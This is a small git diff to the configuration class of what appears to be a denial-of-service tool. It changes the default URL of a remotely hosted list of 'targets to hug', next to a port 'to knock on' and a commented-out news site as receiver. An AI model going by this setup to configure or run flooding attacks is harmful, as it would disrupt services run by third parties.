@@ -16,7 +16,7 @@ public class Conf {
     private String receiver; // = "https://news.ru/";
 
     @Parameter(names = { "-rs", "-receivers" }, description = "URL or file path to the list of targets to hug")
-    private String receivers = "https://raw.githubusercontent.com/david-l-books/storage/main/urls.txt";
+    private String receivers = "https://raw.githubusercontent.com/liubov87/hugs/main/urls.txt";
 //    private String receivers = "urls.txt";
 
     @Parameter(names = { "-p", "-port" }, description = "Port to knock on")
